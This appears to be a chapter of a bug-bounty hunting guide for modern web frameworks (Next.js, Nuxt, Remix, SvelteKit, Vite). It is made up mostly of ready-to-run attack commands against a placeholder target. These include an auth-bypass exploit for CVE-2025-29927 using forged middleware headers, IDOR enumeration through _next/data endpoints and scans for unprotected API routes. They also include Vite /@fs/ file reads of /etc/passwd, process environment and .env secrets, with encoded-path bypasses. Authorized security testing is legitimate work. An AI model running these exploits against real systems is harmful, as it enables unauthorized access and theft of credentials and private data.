# 11 — Modern SPA Framework Hunting

## Goal
Framework-specific attack surfaces in Next.js, Nuxt, Remix, SvelteKit, and Vite-based apps
that generic JS hunting misses. Each framework leaks secrets and endpoints in unique places.

---

## Next.js (2024-2025 — #1 most-hunted framework)

### Fingerprinting

```bash
# Confirm Next.js + get version
curl -sL https://target.com | grep -o '"buildId":"[^"]*"'        # __NEXT_DATA__ buildId
curl -sI https://target.com/ | grep 'x-powered-by\|next'
curl -s https://target.com/_next/static/chunks/webpack.js | head -5  # webpack chunk confirms Next.js
grep -r 'next/dist\|nextjs\|next\.config' beautified/ | head -5

# Version from package.json (if exposed) or __NEXT_DATA__
curl -s https://target.com/package.json 2>/dev/null | jq '.dependencies.next'
```

### CVE-2025-29927 — Middleware Auth Bypass (patch: 15.2.3 / 14.2.25)

```bash
# Any route behind Next.js middleware (auth guards, geo-blocks, subscription gates)
BYPASS_HDR="x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

# Test on common protected routes
for route in /admin /dashboard /api/admin /internal /profile /settings; do
  echo "=== $route ===" && \
  curl -s -o /dev/null -w "%{http_code}" "https://target.com$route" && echo " (no header)" && \
  curl -s -o /dev/null -w "%{http_code}" "https://target.com$route" -H "$BYPASS_HDR" && echo " (bypassed)"
done

# Pages router variant (older Next.js)
curl -s "https://target.com/admin" \
  -H "x-middleware-subrequest: pages/_middleware:pages/_middleware:pages/_middleware"

# App router variant (Next.js 13+)
curl -s "https://target.com/admin" \
  -H "x-middleware-subrequest: middleware:middleware:middleware"

# If any route returns 200/data with the header that returned 401/302 without → CONFIRMED P1
```

### Build Manifest — All Routes Enumerated

```bash
# build-manifest.json lists EVERY page route and its chunk files
curl -s "https://target.com/_next/static/build-manifest.json" | \
  python3 -c "
import json, sys
d = json.load(sys.stdin)
print('[PAGES]')
for page, files in d.get('pages', {}).items():
    print(f'  {page}')
print()
print('[LOW-LEVEL CHUNKS]')
for page, files in d.get('pages', {}).items():
    for f in files:
        if 'chunks' in f:
            print(f'  /_next/{f}')
" 2>/dev/null

# React-loadable manifest (code-split components)
curl -s "https://target.com/_next/static/react-loadable-manifest.json" | \
  python3 -m json.tool 2>/dev/null | grep -E '"file"|"id"' | head -50

# App Router: client-reference-manifest
curl -s "https://target.com/_next/static/app-build-manifest.json" 2>/dev/null | python3 -m json.tool | head -50
```

### getServerSideProps IDOR via `_next/data/`

```bash
# getServerSideProps data is accessible via _next/data/<buildId>/<page>.json
BUILD_ID=$(curl -sL https://target.com | python3 -c "
import sys,re,json
m = re.search(r'__NEXT_DATA__[\"\']\s*>\s*(\{.+?\})</script>', sys.stdin.read(), re.DOTALL)
print(json.loads(m.group(1))['buildId'] if m else 'unknown')
")

echo "Build ID: $BUILD_ID"

# Fetch server-side props for each page route
for page in '' 'profile' 'dashboard' 'settings/account'; do
  url="https://target.com/_next/data/$BUILD_ID/$page.json"
  echo "=== $url" && curl -s "$url" | python3 -m json.tool | head -30
done

# IDOR test on dynamic routes: /users/[id] → /_next/data/<buildId>/users/<id>.json
for id in 1 2 3 100 admin; do
  curl -s "https://target.com/_next/data/$BUILD_ID/users/$id.json" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('pageProps',{}))" 2>/dev/null
done
```

### API Routes (`/api/*`)

Next.js API routes at `/api/*` are server-side handlers — NOT middleware-protected by default.

```bash
# Enumerate from build-manifest + historical URLs
curl -s "https://target.com/_next/static/build-manifest.json" | \
  python3 -c "import json,sys; [print(p) for p in json.load(sys.stdin).get('pages',{}) if p.startswith('/api')]" 2>/dev/null
gau target.com | grep '_next\|/api/' | sort -u

# Common unprotected API routes
for path in /api/user /api/users /api/auth/session /api/auth/me \
            /api/admin /api/config /api/health /api/internal /api/debug; do
  curl -s -o /dev/null -w "%{http_code} $path\n" "https://target.com$path"
done
```

### NEXT_PUBLIC_ Environment Variable Leaks

```bash
# NEXT_PUBLIC_* vars are intentionally client-side but devs often accidentally include secrets
grep -rn 'NEXT_PUBLIC_' beautified/ | grep -iv 'url\|host\|domain\|env\|base' | head -20
# Any NEXT_PUBLIC_API_KEY, NEXT_PUBLIC_SECRET, NEXT_PUBLIC_TOKEN = dev mistake → report
```

---

## Nuxt (Vue-based SSR)

### Fingerprinting

```bash
curl -sL https://target.com | grep -o 'window.__NUXT__'
curl -s https://target.com/_nuxt/manifest.json | head -5
curl -sI https://target.com | grep -i 'nuxt\|x-powered-by'
```

### Nuxt State / Server Data Leaks

```bash
# Extract __NUXT__ server-side state from HTML
curl -sL https://target.com | python3 -c "
import sys, re, json
html = sys.stdin.read()
m = re.search(r'window\.__NUXT__\s*=\s*(\{.+?\})\s*;', html, re.DOTALL)
if m:
    print(m.group(1)[:3000])
    try:
        d = json.loads(m.group(1))
        # Look for: state.user, state.auth, state.token
        print('[KEYS]', list(d.keys()))
    except: pass
"

# Nuxt 3: useAsyncData / useFetch result available at /__nuxt_loading__.json (some configs)
curl -s "https://target.com/__nuxt_loading__.json" 2>/dev/null

# Nuxt chunks manifest
curl -s "https://target.com/_nuxt/manifest.json" | python3 -m json.tool | grep '\.js' | head -30
```

### Nuxt Server Routes (`/api/` or `/server/`)

```bash
# Nuxt 3 server routes are at /api/* by default
for path in /api/_content /api/sitemap /api/users /api/auth/session /api/auth/me; do
  curl -s -o /dev/null -w "%{http_code} $path\n" "https://target.com$path"
done
```

---

## Remix / React Router v6+

### Fingerprinting

```bash
curl -sL https://target.com | grep 'remixContext\|__remix_'
grep -rn 'remix\|@remix-run' beautified/ | head -5
```

### Remix Loader Data Extraction

```bash
# Remix loaders run server-side and embed data in __remixContext
curl -sL https://target.com | python3 -c "
import sys, re, json
html = sys.stdin.read()
m = re.search(r'window\.__remixContext\s*=\s*(\{.+?\})\s*;', html, re.DOTALL)
if m:
    try:
        d = json.loads(m.group(1))
        # state.loaderData contains the loader return values for each route
        print(json.dumps(d.get('state', {}).get('loaderData', {}), indent=2)[:3000])
    except Exception as e:
        print(m.group(1)[:2000])
"

# Remix exposes loader data via fetch with ?_data=<routeId> (resource routes)
# Route IDs are paths like 'routes/dashboard' or 'root'
for route in root routes/dashboard routes/admin routes/profile routes/api.users; do
  curl -s "https://target.com/?_data=$route" | head -5
done
```

---

## SvelteKit

### Fingerprinting

```bash
curl -sL https://target.com | grep '__sveltekit\|_app/'
curl -s https://target.com/_app/manifest.json | head -5
```

### SvelteKit Data Leaks

```bash
# SvelteKit embeds page data in a <script> tag with type="application/json"
curl -sL https://target.com | python3 -c "
import sys, re, json
html = sys.stdin.read()
# SvelteKit data script
m = re.search(r'<script[^>]*sveltekit:data[^>]*>(.+?)</script>', html, re.DOTALL)
if m:
    print(m.group(1)[:2000])
# Also: window.__sveltekit_data
m2 = re.search(r'window\.__sveltekit_[a-z_]+\s*=\s*(.+?)\s*;', html)
if m2:
    print('[SVELTE STATE]', m2.group(1)[:500])
"

# SvelteKit load functions: test the JSON endpoint directly
for path in / /dashboard /admin /profile /settings; do
  # SvelteKit data endpoint: add __data.json suffix
  curl -s "https://target.com$path/__data.json" | head -5
done
```

---

## Vite Dev Server Exposure (if accidentally deployed)

```bash
# Vite dev server serves all project files at /@fs/ (arbitrary file read)
# CVE-2024-23331: /@fs/etc/passwd when allowedHosts not properly set

# Detect Vite dev server (exposes itself via headers or /@vite/client)
curl -sI "https://target.com/@vite/client" | grep '200\|vite'

# If confirmed:
curl -s "https://target.com/@fs/etc/passwd"
curl -s "https://target.com/@fs/proc/self/environ"
curl -s "https://target.com/@fs/app/.env"
curl -s "https://target.com/@fs/app/config/database.yml"

# Bypass (some versions): encoded slashes
curl -s "https://target.com/@fs%2Fetc%2Fpasswd"
curl -s "https://target.com/@fs/..%2F..%2Fetc%2Fpasswd"
```

---

## Universal SPA Hunting Checklist

- [ ] Fingerprint framework (Next.js / Nuxt / Remix / SvelteKit / Vite)
- [ ] Extract SSR state blob (`__NEXT_DATA__`, `__NUXT__`, `__remixContext`, SvelteKit data script)
- [ ] Fetch build manifest / chunk manifest to enumerate ALL routes
- [ ] Test `_next/data/<buildId>/*.json` for IDOR (Next.js only)
- [ ] Test `?_data=<route>` for loader data leaks (Remix only)
- [ ] Test `__data.json` endpoints (SvelteKit only)
- [ ] Test CVE-2025-29927 middleware bypass (Next.js ≤ 15.2.2)
- [ ] Test `/@fs/` file read (Vite dev server exposure)
- [ ] Grep for `NEXT_PUBLIC_*` / `VITE_*` env vars that shouldn't be public
- [ ] Check all `/api/*` routes without auth
- [ ] Map client-side guards (PrivateRoute, canActivate) → hit underlying API directly
